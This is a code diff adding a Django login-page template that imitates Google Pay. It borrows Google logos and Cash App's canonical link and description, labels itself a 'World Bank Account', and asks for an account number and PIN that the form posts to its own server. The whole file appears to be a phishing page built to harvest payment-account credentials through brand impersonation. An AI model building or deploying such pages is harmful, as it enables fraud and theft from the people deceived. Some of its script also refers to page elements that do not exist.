@@ -1,0 +1,544 @@
+{% load static %}
+{% load crispy_forms_tags %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Google Pay Account</title>
+<link rel="icon" href="https://i.postimg.cc/tg7GZGXq/google-pay-image-imageonline-co-2132854.png" type="image/x-icon" sizes="80x80">
+
+  <link href="{% static 'fontawesomefree/css/all.min.css' %}" rel="stylesheet" type="text/css">
+    <link rel="canonical" href="https://cash.app/login">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+    <meta name="description" content="Sign in to your Cash App account. View transaction history, manage your account, and send payments.">
+<style>
+    body {
+        font-family: Arial, sans-serif;
+        margin: 0;
+        padding: 0;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        overflow: hidden; /* Hide overflow to prevent scrolling */
+    }
+
+
+
+
+
+    .logo {
+        position: absolute;
+        top: 16px;
+        left: 20px;
+        width: 55px;
+    }
+
+    .app-name {
+        position: absolute;
+        top: 10px;
+        right: 20px;
+        display: flex;
+        align-items: center;
+        color: #fff;
+        font-weight: bold;
+        font-size: 1.2em;
+        text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.6);
+    }
+    .app-name img {
+        margin-left: 5px; /* Adjust the spacing between text and image */
+    }
+
+        
+        .pic{
+            margin-right: 15px; /* Adjust the spacing between text and image */
+            top: 1px;
+
+
+        }
+    video {
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        object-fit: cover;
+        z-index: -1000; /* Place the video behind other elements */
+    }
+
+    .container {
+        max-width: 400px;
+        width: 75%;
+        padding: 20px;
+        background-color: #fff;
+        border-radius: 15px;
+        box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+        position: relative;
+        z-index: 1; /* Ensure the form is above the video */
+
+    }
+
+    .phone-input {
+        display: flex;
+        align-items: center;
+        border: 1px solid #ccc;
+        border-radius: 5px;
+        overflow: hidden;
+    }
+    
+    .country-code {
+        display: flex; /* Change to flex */
+        align-items: center; /* Align items vertically */
+        padding: 10px;
+        background-color: #F5F5F5;
+        border-right: 1px solid #ccc;
+        cursor: pointer;
+        font-weight: 900;
+    }
+    
+    .country-code img {
+        margin-right: 5px;
+        vertical-align: middle;
+        width: 25px; /* Set a fixed width for the image */
+        height: 20px; /* Set a fixed height for the image */
+    }
+    
+
+
+    
+    .country-code-dropdown li {
+        padding: 40px 10px;
+        height: 20px;
+        cursor: pointer;
+        margin-left: -40px;
+        background-color: #BDEDFF	;
+        border-radius: 10px;
+        margin-top: 20px;  
+        color:#040720 ;
+        list-style-type: none;
+        font-size: 17px;
+
+    }
+    
+    .country-code-dropdown li:hover {
+        background-color: #007C80	;
+        color: #FFFFFF;
+        border-style: solid;
+        border-color: #BDEDFF;
+
+    }
+    
+
+
+    .country-code-dropdown .img {
+        margin-bottom: -4px;
+
+    }
+
+
+
+    .phone-number, .password {
+        flex: 1;
+        padding: 10px;
+        border: none;
+        outline: none;
+        font-size: inherit;
+        font-family: Verdana;
+        color: #040720;
+
+    }
+
+
+    .form-control{
+        font-family: Verdana;
+        color: #040720;
+        
+    }
+
+
+
+    button {
+        width: 100%;
+        padding: 10px;
+        margin-top: 10px;
+        background-color: #0088cc;
+        color: #fff;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
+    }
+
+    button:hover {
+        background-color: #005580;
+    }
+
+
+    .forgot-password {
+        margin-top: 16px; /* Adjust the margin to move it down */
+        text-align: right;
+        color: #0059FF;
+    }
+
+    .password-input {
+        position: relative;
+    }
+    
+    .password-input input {
+        width: calc(102% - 30px); /* Adjust the width of the input box */
+        padding: 10px;
+        border: 1px solid #ccc;
+        border-radius: 5px;
+        outline: none;
+        font-size: inherit;
+        margin-top: -10px; /* Adjust the margin to move it down */
+
+    }
+    
+    .password-toggle {
+        position: absolute;
+        top: 36%; /* Position the toggle button in the middle vertically */
+        right: 13px; /* Adjust the position from the right */
+        transform: translateY(-50%); /* Center vertically */
+        cursor: pointer;
+    }
+    
+
+    @media (max-width: 1300px) {
+        .forgot-password {
+            display: block;
+            text-align: right;
+            color: red;
+
+
+        }
+    }
+    
+    @media (min-width: 769px) {
+        .forgot-password {
+            margin-left: 200px;
+            margin-top: 
+
+        }
+    }
+    a:hover {
+        color: #800517;
+      }
+
+
+
+
+
+
+
+
+      .btn {
+        width: 100%;
+        padding: 8px;
+        background-color: #007bff;
+        color: #fff;
+        text-align: center;
+        border: none;
+        border-radius: 3px;
+        cursor: pointer;
+        font-weight: 900;
+    }
+
+    .btn:hover {
+        background-color: #033E3E;
+    }
+
+      .signup-link {
+        text-align: center;
+        margin-top: 10px;
+    }
+
+    .signup-link a {
+        color: #007bff;
+        text-decoration: none;
+    }
+
+    .signup-link a:hover {
+        text-decoration: none;
+        color: #800517;
+    }
+
+      
+    .form-group {
+        display: flex;
+        flex-direction: column;
+        margin-bottom: 21px;
+    }
+
+    label {
+        margin-bottom: 5px;
+        font-weight: bold;
+        color: #555;
+        text-align: left;
+        margin-left: 4px;
+    }
+
+
+
+    .custom-close-button {
+        position: absolute;
+        top: 50%;
+        right: 2px;
+        transform: translateY(-50%);
+        background-color: transparent;
+        border: none;
+        cursor: pointer;
+        font-size: 27px;
+        
+    }
+    .custom-close-button:hover {
+        color: black;
+        opacity: 1;
+    }
+
+
+
+    .alert {
+        padding: 20px;
+        background-color: #f44336;
+        color: white;
+      }
+      
+      .closebtn {
+        margin-left: 15px;
+        color: white;
+        font-weight: bold;
+        float: right;
+        font-size: 22px;
+        line-height: 20px;
+        cursor: pointer;
+        transition: 0.3s;
+      }
+      
+      .closebtn:hover {
+        color: black;
+      }
+
+    .google {
+        text-align: center;
+
+      }
+
+
+
+
+
+      .modal {
+        display: none;
+        position: fixed;
+        z-index: 1;
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        overflow: auto;
+        background-color:  rgba(0, 0, 0, 0.9);
+
+    }
+
+    .modal-content {
+        background-color:#033E3E;
+        margin: 15% auto;
+        padding: 20px;
+        border: 2px solid #F0FFFF	;
+        width: 80%;
+        max-width: 600px;
+        border-radius: 20px;
+        color: #EBF4FA;
+        font-weight: 900;
+    }
+
+    .close {
+        color: #aaa;
+        float: right;
+        font-size: 28px;
+        font-weight: bold;
+        margin-top: -14px;
+    }
+
+    .close:hover,
+    .close:focus {
+        color: #EBF4FA;
+        text-decoration: none;
+        cursor: pointer;
+    }
+
+
+
+    
+</style>
+</head>
+<body>
+    <video autoplay muted loop>
+        <source src="static/video/y2mate.com - Apple Pay  The Dance  Apple_1080p.mp4" type="video/mp4">
+        Your browser does not support the video tag.
+    </video>
+    <div class="container">
+        {% for message in messages %}
+            <div class="alert">
+                <span class="closebtn" onclick="this.parentElement.style.display='none';">&times;</span> 
+                <strong>{{ message }}</strong> 
+              </div>
+        {% endfor %}
+        <div class="google"><img  src="https://i.postimg.cc/fycGnwvK/google_image-modified.png" alt="Close Icon" style="width: 190px; height: 90px; margin-bottom: -20px; margin-right: -2px;"></div>
+        <div style="display: flex; align-items: center; justify-content: center; margin-bottom: 15px;">
+            <span  style="margin-left: 3px; font-weight: 900; font-family: Georgia, sans-serif; color: #3A3B3C;"><i class="fa-solid fa-building-columns"></i> World Bank Account</span>
+
+        </div>
+        </span>
+        <marquee behavior="scroll" direction="left" style="margin-bottom: 18px;">
+            <span style="font-weight: 300; font-family:calibri ; color: #3A3B3C; text-align: right;">Access the google account using your account number and pin.</span>
+        </marquee>
+        
+
+
+
+
+          
+        <form method="post" >
+        
+            {% csrf_token %}
+    <div class="form-group">
+
+                <label for="phone" >Account Number</label>
+                    <div class="phone-input">
+                        <div class="country-code" id="openModalBtn" onclick="toggleDropdown()">
+                            <img  src="https://upload.wikimedia.org/wikipedia/en/thumb/a/a4/Flag_of_the_United_States.svg/1920px-Flag_of_the_United_States.svg.png" width="25" height="20"> +1</div>
+
+                                    <div id="myModal" class="modal country-code-dropdown">
+                                        <div class="modal-content">
+                                        <span class="close">&times;</span>
+                                        <ul id="countryCodeDropdown" class="country-code-dropdown">
+                                            <li onclick="selectCountryCode('+1', 'https://upload.wikimedia.org/wikipedia/en/thumb/a/a4/Flag_of_the_United_States.svg/1920px-Flag_of_the_United_States.svg.png')">
+                                                <img class="img" src="https://upload.wikimedia.org/wikipedia/en/thumb/a/a4/Flag_of_the_United_States.svg/1920px-Flag_of_the_United_States.svg.png" width="25" height="20"> <span  style="margin-left: 7px;"> United State (+1)</span>
+                                            </li>
+                                            <li onclick="selectCountryCode('+44', 'https://upload.wikimedia.org/wikipedia/en/thumb/a/ae/Flag_of_the_United_Kingdom.svg/1920px-Flag_of_the_United_Kingdom.svg.png')">
+                                                <img class="img" src="https://upload.wikimedia.org/wikipedia/en/thumb/a/ae/Flag_of_the_United_Kingdom.svg/1920px-Flag_of_the_United_Kingdom.svg.png" width="25" height="20">  <span style="margin-left: 7px;">United Kingdom (+44)</span>
+                                            </li>
+                                        </ul>
+                                        </div>
+                                    </div>
+  
+
+                        <input type="text" id="phone" class="phone-number" placeholder="Enter Account number" name="phone_number"  required>
+                    </div>
+                </div>
+
+
+
+            <div class="form-group">
+                <label for="password" class="form-label" style="text-align: left; margin-bottom: -33px; margin-left: 4px;">Account Pass</label>
+                <p class="forgot-password" style=""><a href="" style="text-decoration: none; font-weight: 400; color: #0059FF; transition: color 0.3s;" onmouseover="this.style.color='#800517'" onmouseout="this.style.color='#0059FF'">Forgot pin?</a></p>
+
+                <div class="password-input">
+                    <input type="password" id="password" class="form-control" name="password" placeholder="Enter Account Pin" required>
+                    <span class="password-toggle" onclick="togglePasswordVisibility()"><i id="eye-icon" class="fas fa-eye"></i></span>
+                </div>
+            </div>
+            <button type="submit" class="btn">Login</button>
+</form>
+
+
+        <div class="signup-link">
+            <p>Don't have an account? <a href="" style"text-decoration: none;">Sign up</a></p>
+        </div>
+    </div>
+    <div class="app-name">
+        <img src="https://i.postimg.cc/fycGnwvK/google-image-modified.png" alt="Close Icon" style="width: 90px; height: 50px;">
+        <span>Pay</span>
+    </div>
+    <script>
+        function toggleDropdown() {
+            var dropdown = document.getElementById('myModal');
+            if (dropdown.style.display === 'none' || dropdown.style.display === '') {
+                dropdown.style.display = 'block';
+            } else {
+                dropdown.style.display = 'none';
+            }
+        }
+
+        function selectCountryCode(openModalBtn, flagUrl) {
+            document.getElementById('openModalBtn').innerHTML = `<img src="${flagUrl}" width="25" height="20">${openModalBtn}`;
+            toggleDropdown(); // Hide the dropdown after selecting a country
+        }
+
+        {% comment %} function togglePasswordVisibility() {
+            var passwordInput = document.getElementById("password");
+            if (passwordInput.type === "password") {
+                passwordInput.type = "text";
+            } else {
+                passwordInput.type = "password";
+            }
+        } {% endcomment %}
+    </script>
+
+    <script>
+        function togglePasswordVisibility() {
+            var passwordField = document.getElementById("password");
+            var eyeIcon = document.getElementById("eye-icon");
+        
+            if (passwordField.type === "password") {
+                passwordField.type = "text";
+                eyeIcon.classList.remove("fa-eye");
+                eyeIcon.classList.add("fa-eye-slash");
+            } else {
+                passwordField.type = "password";
+                eyeIcon.classList.remove("fa-eye-slash");
+                eyeIcon.classList.add("fa-eye");
+            }
+        }
+        </script>
+
+
+    <script>
+        // Get the modal
+        var modal = document.getElementById('myModal');
+    
+        // Get the button that opens the modal
+        var btn = document.getElementById("openModalBtn");
+    
+        // Get the <span> element that closes the modal
+        var span = document.getElementsByClassName("close")[0];
+    
+        // Get the close button inside the modal
+        var closeModalBtn = document.getElementById("closeModalBtn");
+    
+        // Get the save changes button inside the modal
+        var saveChangesBtn = document.getElementById("saveChangesBtn");
+    
+        // When the user clicks the button, open the modal
+        btn.onclick = function() {
+            modal.style.display = "block";
+        }
+    
+        // When the user clicks on <span> (x), close the modal
+        span.onclick = function() {
+            modal.style.display = "none";
+        }
+    
+        // When the user clicks on close button, close the modal
+        closeModalBtn.onclick = function() {
+            modal.style.display = "none";
+        }
+    
+        // When the user clicks on save changes button, do something and close the modal
+        saveChangesBtn.onclick = function() {
+            // Perform some action here
+            alert("Changes saved!");
+            modal.style.display = "none";
+        }
+    
+        // When the user clicks anywhere outside of the modal, close it
+        window.onclick = function(event) {
+            if (event.target == modal) {
+                modal.style.display = "none";
+            }
+        }
+    </script>
+</body>
+</html>
